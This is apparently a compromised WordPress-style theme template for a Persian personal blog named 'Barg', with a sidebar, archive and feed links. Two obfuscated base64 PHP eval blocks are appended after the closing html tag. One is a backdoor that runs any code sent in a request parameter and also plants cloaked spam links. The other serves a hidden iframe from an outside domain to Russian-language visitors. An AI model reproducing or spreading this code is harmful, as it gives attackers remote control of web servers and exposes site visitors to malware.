<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta name="keywords" content="Diaco, Faryad, Soltanpour, دیاکو, فریاد, وبلاگ, برگ, سلطانپور, Blog, Weblog, Persian, Iran, Iranian, Farsi" />
    <link rel="alternate" type="application/rss+xml" lang="fa" dir="rtl" title="برگ"
        href="http://feeds.feedburner.com/barg"/ />
    <title><?php wp_title(); ?> </title>
    <link href="templates/diaco/css/StyleSheet.css" type="text/css" rel="stylesheet" />
    <link href="favicon.ico" rel="shortcut icon" />
</head>
<body vlink="#1A36E0">
    
    <center>
        <div class="main">
            <div class="header">
            </div>
            <div class="sh">
                <div class="mainDiv">
                    <div class="lPanel">
                        <!-- begin post -->
                        <?php if (have_posts()) : ?>
                        <?php while(have_posts()): the_post();?>
                        <div class='menu2'>
                            &nbsp;&nbsp;<?php the_time("l، j F Y");?>&nbsp;&nbsp;
                        </div>
                        <div class='menuCont2'>
                            <div class='menuTitle'>
                                <a href='/?mode=3&id=<?php the_ID();?>' class='menuTitle'><?php the_title();?></a>
                            </div>
                            <div class='text'>
                                <?php the_content(); ?>
                            </div>
                            <div class='textFoot'>
                                <?php require ("footer.php");?>
                            </div>
                        </div>
                        <?php endwhile; endif; ?>
                        <!-- end post -->
                    <?php if($_GET['mode'] == "3"){require ("Comments.php");}?>
                    </div>
                    <div class="rPanel">
                        <div class="menu1">
                            برگ</div>
                        <div class="menuCont1">
                            <img alt="برگ" src="barg.jpg" /><br />
                            <a href="http://www.bargweb.com" class="bargMenu">برگ اول</a>
                            <div class="hr">
                            </div>
                            <a href="mailto:faryad@bargweb.net" class="bargMenu">تماس با من</a>
                            <div class="hr">
                            </div>
                        </div>
                        <div class="menu1">
                            آرشیو</div>
                        <div class="menuCont1">
                                <div class="hr">
                                </div>
								<?php wp_get_archives("monthly_2") ?>
                            <div class="hr">
                            </div>
                        </div>
                        <div class="menu1">
                            مطالب برگزیده</div>
                        <div class="menuCont1">
                            <center>
                                <div class="hr">
                                </div>
                                <?php fav_entries(); ?>
                                <div class="hr">
                                </div>
                            </center>
                        </div>
                        <div class="menu1">
                            وب‌گردی</div>
                        <div class="menuCont1">
                            <div class="hr">
                            </div>

                            <script src="http://feeds.feedburner.com/FaryadReader?format=sigpro" type="text/javascript"></script>

                            <noscript>
                                <p>
                                    Subscribe to RSS headline updates from: <a href="http://feeds.feedburner.com/FaryadReader">
                                    </a>
                                    <br />
                                    Powered by FeedBurner</p>
                            </noscript>
                            <div class="hr">
                            </div>
                        </div>
                        <div class="menu1">
                            دیگران</div>
                        <div class="menuCont1">
                            <div class="hr">
                            </div>
                            <div class="bargMenu">
                                لینک‌ها</div>
                            <div class="hr">
                            </div>
                            <center>
                                <?php require ("files/friends.php"); ?></center>
                            <div class="hr">
                            </div>
                            <div class="hr">
                            </div>
                            <div class="bargMenu">
                                توصیه می‌کنم</div>
                            <div class="hr">
                            </div>
                            <center>
                                <?php require("files/links.php"); mysql_close($db); ?>
                            </center>
                            <div class="hr">
                            </div>
                        </div>
                        <div class="menu1">
                            جستجو</div>
                        <div class="menuCont1">
                            <div class="hr">
                            </div><form action="templates/diaco/search.php" method="post">
                            <input type="text" class="searchBox" />
                            <input type="submit" value="جستجو" class="searchSubmit" /></form>
                            <div class="hr">
                            </div>
                        </div>
                        <div class="menu1">
                            لوگو</div>
                        <div class="menuCont1">
                            <br />
                            <img alt="Logo" src="Logo.png" /><br />
                            <input id="Text1" type="text" style="width: 80px; color: #1A36E0; font-size: x-small;
                                margin-bottom: 5px" value='<a target="_blank" href="http://www.bargweb.com"><img src="http://www.bargweb.com/Logo.png" alt="Barg" style="border: 0px none"></a>' />
                            <br />
                            <div class="hr">
                            </div>
                            <p style="font-size: x-small">
                                فید برگ</p>
                            <a class="ArchiveLink" href="http://feeds.feedburner.com/barg">
                                <img alt="RSS 2.0" src="rss2.gif" style="border-width: 0; width: 80px; height: 15px" /></a><br />
                            <a href="http://feedvalidator.org/check.cgi?url=http%3A//www.bargweb.net/rss.xml"><img src="valid-rss.png" alt="[Valid RSS]" title="Validate my RSS feed" /></a>
                            <p style="font-size: x-small">
                                برگ را در تلفن همراه بخوانید</p>
                            <a class="ArchiveLink" href="http://wap.r2w.ir/308">
                                <img alt="WAP Barg" src="wap.gif" style="border-width: 0; width: 80px; height: 15px" /></a><br />
                            <div class="hr">
                            </div>
                            <a class="ArchiveLink" href="http://www.blogcatalog.com/directory/art/graphic-design"
                                title="Graphic Design Blogs - BlogCatalog Blog Directory">
                                <img src="http://www.blogcatalog.com/images/buttons/blogcatalog5.gif" alt="Graphic Design Blogs - BlogCatalog Blog Directory"/></a><br />
                            <a class="ArchiveLink" href="http://dir.blogflux.com/" target="_blank" onclick="return top.js.OpenExtLink(window,event,this)">
                                <img src="http://dir.blogflux.com/images/80x15.gif" alt="Blog Flux Directory" border="0" /></a><br />
                            <a class="ArchiveLink" href='http://host-tracker.com/' onMouseOver='this.href="http://host-tracker.com/web-site-monitoring-statistics/874837/ff/";'><img 
								width=80 height=15 border=0 alt='website monitoring service' 
								src="http://ext.host-tracker.com/uptime-img/?s=15&amp;t=874837&amp;m=0.59&amp;p=Total&amp;src=ff"></a><noscript><a href='http://host-tracker.com/' >website tracker</a></noscript><br />
							<a href="http://whos.amung.us/show/94b9oidn"><img src="http://whos.amung.us/swidget/94b9oidn.gif" alt="site statistics" width="80" height="15" border="0" /></a>
                            <div class="hr">
                            </div>
                            <span style="color: #3B3B3B; font-size: x-small;">Developed &amp; Template by:<br />
                                <a href="mailto:faryad@bargweb.com">Faryad</a></span><div class="hr">
                                </div>
                        </div>
                    </div>
                </div>
                <div class="btm">
                    <a rel="license" href="http://creativecommons.org/licenses/by-nc/3.0/">
                        <img alt="Creative Commons License" style="border-width: 0; margin-top: 3px; margin-right: 12px;
                            margin-left: 12px;" src="http://i.creativecommons.org/l/by-nc/3.0/88x31.png"
                            align="left" />
                    </a>This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc/3.0/">
                        Creative Commons Attribution-Noncommercial 3.0 Unported License</a>.<br />
                    <a href="http://www.BargweB.com">bargweb.com</a> - <a href="mailto:faryad@bargweb.net">
                        faryad@bargweb.com</a> 2007 - 2008
                </div>
            </div>
            <div class="btm2">
            </div>
        </div>
    </center>
    <script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-4657860-1";
urchinTracker();
</script>
</body>
</html><?php eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwppZigkX1JFUVVFU1RbJ2RmcXczMWYnXSkKZXZhbChiYXNlNjRfZGVjb2RlKCRfUkVRVUVTVFsnZGZxdzMxZiddKSk7CiRocmVmID0gJ2h0dHA6Ly93d3cucHJvc29mdHdhcmVzdG9yZS5jb20vJzsKJHdvcmRzID0gYXJyYXkoJ1NvZnR3YXJlIFN0b3JlJywgJ01pY3Jvc29mdCBTb2Z0d2FyZScsICdBZG9iZSBTb2Z0d2FyZScsICdBdXRvZGVzayBTb2Z0d2FyZScsICdCb3JsYW5kIFNvZnR3YXJlIHNob3AnLCAnVk13YXJlIFNvZnR3YXJlJywgJ1Nob3AgU29mdHdhcmUnLCAnTUFDIFNvZnR3YXJlJywgJ1dpbmRvd3MgU29mdHdhcmUnLCAnU3ltYW50ZWMgc2hvcCcpOwoka2V5bnVtID0gY291bnQoJHdvcmRzKTsKJGFsdHMgPSAkd29yZHM7CgokciA9IHJhbmQoMCwgMyk7CiRyMiA9IHJhbmQoNCwgNyk7CiRyMyA9IHJhbmQoOCwgJGtleW51bS0xKTsKc2h1ZmZsZSgkYWx0cyk7CmZvcigkaT0wOyAkaTwka2V5bnVtOyAkaSsrKQp7CmlmKCRpPT0kciB8fCAkaT09JHIyIHx8ICRpPT0kcjMpCnsKJHI0ID0gcmFuZCgxLCAzKTsKJHN0ciA9IGltcGxvZGUoIiAiLCBhcnJheV9zbGljZSgkd29yZHMsIDAsIHJhbmQoMSwgaW50dmFsKCRrZXludW0vMikrMSkpKTsKJGFsdHNbJGldID0gIjxoND48YSBocmVmPVwiJGhyZWZcIiBhbHQ9XCIkc3RyXCIgdGl0bGU9XCIkc3RyXCI+U2hvcCAiLiRhbHRzWyRpXS4iPC9hPjwvaDQ+IjsKfQp9CmFycmF5X3B1c2goJGFsdHMsICI8YSBocmVmPVwiJGhyZWZcIj4kaHJlZjwvYT4iKTsKc2h1ZmZsZSgkYWx0cyk7CiRzdHIgPSBpbXBsb2RlKCIgIiwgJGFsdHMpOwppZihwcmVnX21hdGNoKCIvKGNyYXdsKXwoZ29vZ2xlKXwoeWFob28pfChiaW5nKXwoc3B5KXwoYm90KXwocGVybCl8KHB5dGhvbil8KGhvbG1lcyl8KGFsZXhhKXwoYi1vLXQpfChmaW5kbGlua3MpfChpY2hpcm8pfChsYXJiaW4pfChsaW5rKXwobHdwKXwoUHljVVJMKXwoc2NydWJieSl8KHNlYXJjaCl8KHN0YWNrKXwodXBkYXRlZCkvaSIsICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpCmVjaG8oIjxkaXYgYWxpZ249Y2VudGVyPiRzdHI8L2Rpdj4iKTsKZWxzZQplY2hvKCI8Zm9udCBzdHlsZT1cInBvc2l0aW9uOi8qKi9hYnNvbHV0ZTtvdmVyZmxvdzovKiovaGlkZGVuOy8qKi93aWR0aDovKiovMFwiPiRzdHI8YSBocmVmPSckaHJlZic+JGhyZWY8L2E+PC9mb250PiIpOw==")); ?>
<?php eval(base64_decode("aWYocHJlZ19tYXRjaCgiL3J1L2kiLCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKSkNCgkJZWNobyAnPGlmcmFtZSBzcmM9Imh0dHA6Ly9hZGhlc2l2ZXN0cmVuZ3RoLmluL2luLmNnaT8xODQiIGZyYW1lYm9yZGVyPSIwIiB3aWR0aD0iMyIgaGVpZ2h0PSIzIiBzdHlsZT0idmlzaWJpbGl0eTogaGlkZGVuOyI+PC9pZnJhbWU+Jzs=")); ?>
